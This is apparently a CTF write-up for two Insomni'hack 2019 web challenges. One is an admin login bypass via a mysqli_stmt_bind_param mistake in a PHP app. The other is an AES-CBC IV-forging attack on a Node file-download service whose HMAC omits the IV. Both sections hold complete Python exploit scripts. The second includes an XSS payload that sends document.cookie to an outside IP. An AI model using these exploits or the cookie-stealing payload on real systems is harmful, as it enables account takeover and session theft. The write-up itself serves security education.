---
layout: post
title: Insomni'hack 2019
category: writeups
tags: [crypto, web]
---

[PHPPrivate](#phpprivate) tldr; invalid prepare SQL function

[SecureFileUpload](#securefileupload) tldr; hmac doesn't include iv -> XSS 

### PHPPrivate

[Source code]({{ "/assets/posts/2019-03-22-insomnihack/phpprivate.tar.gz" }}) (with web.sql and warnings enabled).

Simple web application in php. We can register, login and store files. To get the flag, we must login as the admin.

There are some **potential** bugs:
* in classes/private.class.php, `download` function - path traversal
* in private.php:11 (with `$file['name']`) - XSS
* in private.php:31 - CRLF injection (very potential, `header()` handles newlines)

And two vulnerabilities that we can exploit:
* in private.php:32 (`print $a->download($file['name']);`) and classes/private.class.php, `retrieve` function - no username validation or other authorization mechanism (we can download files of other users once we know hashes of their names)
* in classes/user.class.php:62, `oneTimeLogin` function :
    ```php
    $stmt = mysqli_prepare($db,"SELECT token FROM users_reset WHERE login = ? OR trim(login) = ? ");
    mysqli_stmt_bind_param($stmt,'s',$username);
    $validToken = (string)mysqli_fetch_all(mysqli_stmt_get_result($stmt),MYSQLI_ASSOC)[0]['token'];
    ```
    Incorrect parameters binding. Only one viariable provided in `mysqli_stmt_bind_param` and so `$validToken` becomes empty string.

Using bugs above we can simply login as admin with empty token and get his private files.

Solutions:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''


import requests


# url = 'http://127.0.0.1/phpprivate/index.php'
# proxies = {'http': 'http://localhost:6666'}
url = 'http://10.13.37.44/index.php'
proxies = {}

# we want to login as him
login_target = 'admin'

# arbitrary, registered previously login/pass
login = 'gros'
password = 'gros'


def get_session():
    s = requests.Session()
    s.post(url, params={'page':'login', 'action':'login'}, data={'login':login, 'password':password}, proxies=proxies)
    return s


def ask(s):
    resp = s.post(url, params={'page':'login', 'action':'ask-otp'}, data={'login':login_target}, proxies=proxies)


def confirm(s):
    resp = s.post(url, params={'page':'login', 'action':'confirm-otp'}, data={'login':login_target, 'token':''}, proxies=proxies)


def get_files(s):
    resp = s.get(url, params={'page':'private'}, proxies=proxies)    
    print(resp.text)


if __name__ == "__main__":
    s = get_session()
    ask(s)
    confirm(s)
    get_files(s)
```

### SecureFileUpload

[Source code]({{ "/assets/posts/2019-03-22-insomnihack/securefileupload.tar.gz" }})

There is an form for file uploading. Once some file is uploaded, we can download it by link like `http://127.0.0.1:3000/files/upload_7e43a9915b2889825213d20d35a51844`. The link redirects us to something like:
```
http://127.0.0.1:3000/download?iv=ShpbGBgnDhwRYwLfqkZilw%3D%3D&headers=ZOdRVO%2FsJfjX6Xpb4XeVn9xYvtkHuLMuWin3TD8ICaIPrJKfieAYmd7fWelAISHcj2MTcZ2NWx80rIBGpBD4sq5Ns0vY6Dc%2BZSc0m%2Bh1RSM%3D&mac=UruIcJZwUKg2o%2FXbkGkcvraPe6TbBjPKEN7eR6N%2FNl4%3D
```

There are three params: iv (inicialization vector), headers (encrypted with aes-cbc) and mac (sha256 based hmac). Encrypted headers content is:
```js
let headers = querystring.stringify({
    d : 'attachment',
    t : 'text/plain',
    id: uid
});
```
where `uid` is id of the file to download.

We can also submit a path, which some bot (with the flag inside cookie) will visit:
```js
let url = 'https://securefileupload.insomni.hack/' + req.query.path;
```

Clearly we have to XSS him and steal the cookie. To do that we may use download function (with encrypted headers). Since we control iv and know first block (16 bytes) of the plaintext, we can change the iv in a way that headers will decrypt to arbitrary (chosen by us) value. The only problem could be the mac. But there is a bug in the implementation - mac is computed only over ciphertext, doesn't include iv.

So we upload file with XSS payload, then set up iv of corresponding ciphertext such that the plaintext will set content-type to text/html and content-disposition to anything invalid (so the file won't be treaded as attachement).

Solution:
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
~Gros
'''


from pwn import xor
import requests
from urllib import unquote
from base64 import *


url = 'https://securefileupload.insomni.hack/'
proxies = {}
# url = 'http://localhost:3000'
# proxies = {'https': 'http://localhost:6666'}


def gen_iv(iv_orig):
    iv_plain = 'd=attachment&t=text%2Fplain&id='[:16]
    iv_want = 't=text/html&d=inline&'[:16]
    iv_want = iv_want.rjust(16, '&')
    return xor(iv_plain, iv_want, iv_orig)


def upload(payload):
    url2 = url + "upload"
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://securefileupload.insomni.hack", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary1Dbi1HkEY5FWVYoH", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Referer": "https://securefileupload.insomni.hack/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7"}
    burp0_data = "------WebKitFormBoundary1Dbi1HkEY5FWVYoH\r\nContent-Disposition: form-data; name=\"filetoupload\"; filename=\"r2-d2.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n{}\r\n------WebKitFormBoundary1Dbi1HkEY5FWVYoH--\r\n".format(payload)
    resp = requests.post(url2, headers=burp0_headers, data=burp0_data, verify=False, proxies=proxies)
    result = resp.text[resp.text.index('/files/upload_')+len('/files/upload_'):resp.text.index("'>here!</a>")]
    print('upload: ', result)
    return result


def get_file(file_id):
    resp = requests.get(url+'files/upload_{}'.format(file_id), allow_redirects=False, verify=False,proxies=proxies)
    result = resp.headers['Location']
    result = result.split('?', 1)[-1]
    iv,headers,mac = map(lambda x: unquote(x.split('=',1)[-1]), result.split('&'))
    print(iv, headers, mac)
    iv, headers, mac = map(lambda x: b64decode(x), [iv,headers,mac])
    return iv, headers, mac


def download(iv,headers,mac):
    iv,headers,mac = map(lambda x: b64encode(x), [iv,headers,mac])
    resp = requests.get(url+'download', params={'iv':iv,'headers':headers,'mac':mac}, verify=False, proxies=proxies)
    print(resp.text)


if __name__ == "__main__":
    # or whatever
    payload = """<script>document.location="http://192.168.1.110/xss.php?c="+document.cookie</script>"""

    file_id = upload(payload)
    iv, headers, mac = get_file(file_id)
    iv_want = gen_iv(iv)
    download(iv_want, headers, mac)
```